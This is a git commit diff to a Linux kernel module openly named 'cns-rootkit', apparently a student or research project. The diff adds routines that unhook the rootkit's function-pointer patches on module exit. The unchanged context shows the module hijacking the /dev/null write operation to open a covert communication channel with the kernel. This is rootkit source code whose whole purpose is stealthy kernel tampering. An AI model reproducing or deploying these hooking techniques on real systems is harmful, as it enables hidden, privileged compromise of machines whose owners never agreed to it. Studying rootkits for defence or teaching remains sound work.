969a73b57b2408273d41646ad4108a9746ad3f41
Abhishek Sharma <Abhishek Sharma>
2017-04-22 13:23:24 +0530

    Ädded removal of hooks and clean exit

--- src/cns-rootkit.c
+++ src/cns-rootkit.c
@@ -1,6 +1,7 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
+#include <linux/list.h>
 #include <linux/fs.h>
 #include <linux/slab.h>
 
@@ -67,6 +68,18 @@ void *hook_unpatch(void *modified_function) {
   return NULL;
 }
 
+void hook_remove(void *modified_function) {
+  struct hook *h, *tmp;
+
+  list_for_each_safe(h, tmp, &hook_list, list) {
+    if(h->modified_function == modified_function) {
+      hook_unpatch(modified_function);
+      list_del(&h->list);
+      kfree(h);
+    }
+  }
+}
+
 /*int hook_remove_all() {
 
 }*/
@@ -97,29 +110,19 @@ int establish_comm_channel(void) {
   dev_null_fop = (struct file_operations *) dev_null_file->f_op;
   filp_close(dev_null_file, 0);
   printk(KERN_INFO "cns-rootkit: Got file_operations structure and closed /dev/null\n");
-  /*
-  original_dev_null_write = dev_null_fop->write;
-  DISABLE_W_PROTECTED_MEMORY
-  dev_null_fop->write = cns_rootkit_dev_null_write;
-  ENABLE_W_PROTECTED_MEMORY
-  */
 
   hook_add((void **)(&(dev_null_fop->write)), (void *)cns_rootkit_dev_null_write);
-  hook_patch((void *)cns_rootkit_dev_null_write);
+  hook_patch((void *) cns_rootkit_dev_null_write);
+
   printk(KERN_INFO "cns-rootkit: Successfully established communication channel\n");
   return 0;
 }
 
 int unestablish_comm_channel(void) {
   printk(KERN_INFO "cns-rootkit: Attempting to unestablish communication channel\n");
-  struct file *dev_null_file;
-  if((dev_null_file = filp_open("/dev/null", O_RDONLY, 0)) == NULL) {
-    return -1;
-  }
 
-  struct file_operations *dev_null_fop;
-  dev_null_fop = (struct file_operations *) dev_null_file->f_op;
-  filp_close(dev_null_file, 0);
+  hook_remove((void *) cns_rootkit_dev_null_write);
+
   printk(KERN_INFO "cns-rootkit: Successfully unestablished communication channel\n");
   return 0;
 }
@@ -134,7 +137,9 @@ static int cns_rootkit_init(void) {
 }
 
 static void cns_rootkit_exit(void) {
+  unestablish_comm_channel();
   printk(KERN_INFO "cns-rootkit: Exit\n");
+
 }
 
 module_init(cns_rootkit_init);
